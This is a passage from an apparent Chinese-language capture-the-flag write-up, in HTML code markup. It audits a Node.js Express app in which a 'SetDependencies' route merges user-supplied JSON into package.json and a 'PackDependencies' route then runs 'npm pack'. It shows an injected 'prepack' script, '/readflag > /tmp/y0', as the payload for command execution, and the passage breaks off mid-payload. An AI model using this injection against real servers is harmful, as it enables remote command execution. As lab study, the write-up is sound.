function_">get</span>(<span class="string">&quot;/PacksList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No packed files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; lists.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        result += <span class="string">&quot;&lt;a href=&#x27;/dashboardIndex/DownloadPackage?name=&quot;</span> + lists[i] + <span class="string">&quot;&#x27;&gt;&quot;</span> + lists[i] + <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: result,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Download packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/DownloadPackage&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">query</span>.<span class="property">name</span> === <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        req.<span class="property">query</span>.<span class="property">name</span> = <span class="string">&quot;example.tgz&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> packageName = req.<span class="property">query</span>.<span class="property">name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;/&quot;</span>) !== -<span class="number">1</span> || packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;..&quot;</span>) !== -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;.tgz&quot;</span>) === -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a package file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> packagePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs/&quot;</span>,packageName);</span><br><span class="line">    <span class="keyword">if</span>(!fs.<span class="title function_">existsSync</span>(packagePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> contentType = <span class="string">&quot;application/x-gtar&quot;</span>;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span> + packageName);</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-type&quot;</span>, contentType);</span><br><span class="line">    res.<span class="title function_">download</span>(packagePath,packageName,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Download failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Upload files</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/Upload&quot;</span>,upload.<span class="title function_">any</span>(),<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;upload&quot;</span>,&#123;<span class="attr">upload_result</span>:<span class="string">&quot;plz upload file&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">files</span> || <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">files</span>).<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;No files were uploaded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> file = req.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> fileData = fs.<span class="title function_">readFileSync</span>(file.<span class="property">path</span>).<span class="title function_">toString</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(fileData))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File data invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload/&quot;</span>,file.<span class="property">originalname</span>);</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>) === <span class="string">&quot;.json&quot;</span>) &#123;</span><br><span class="line">            fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload error&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload success&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Not a JSON file&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set dependencies</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pack dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kill installing dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/KillDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Killing dependencies...&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;ps -ef | grep npm | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logout</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Logout&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_login</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_admin</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就开始审计代码了，可以看网页上路由的代码了 </p><p><code>// Set dependencies</code>路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里由于这个post值可控，于是data就可控</p><p><img src="../images/image-20230504195748835.png" alt="image-20230504195748835"></p><p><img src="../images/image-20230504195839820.png" alt="image-20230504195839820"></p><p>这段代码定义了一个 JavaScript 对象 <code>exampleJson</code>，表示一个 Node.js 应用程序的 <strong>package.json</strong> 文件内容。这个对象包含了应用程序的名称、版本、描述、作者、脚本、许可证和依赖项等信息。</p><p><code>Object.assign</code> 方法用于将新的属性值合并到现有对象中。这里，我们将空对象 <code>&#123;&#125;</code> 作为第二个参数传递给 <code>Object.assign</code>，因此不会修改现有对象 <code>exampleJson</code>，而是返回一个新对象，该对象包含 <code>exampleJson</code> 的所有属性以及在 <code>data</code> 对象中定义的任何新属性。</p><p>如果 <code>data</code> 对象中定义了与 <code>exampleJson</code> 中相同的属性，则将覆盖原有属性。因此，可以通过 <code>Object.assign</code> 方法来修改或更新现有对象的属性。<strong>在这个例子中，我们使用 <code>Object.assign</code> 来将 <code>data</code> 对象的属性值合并到 <code>exampleJson</code> 对象中，实现了更新 package.json 文件内容的目的。</strong></p><p><code>//PackDependencies</code>路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里面的有个执行函数，他的意思是</p><p><code>cp.exec(&quot;cd &quot; + filePath + &quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;,(err,stdout,stderr) =&gt; &#123;</code> <code>npm pack</code>就相当与重新加载里面的json数据会变成我们改变过的，然后exec执行</p><p><img src="../images/image-20230504200640051.png" alt="image-20230504200640051"></p><p>接下来我们就可以使用临时文件来替换这个代码，因为临时目录下文件权限较高</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exampleJson = </span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line"><span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line"><span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line"><span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;/readflag &gt; /tmp/y0&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;license&quot;</span>: <span 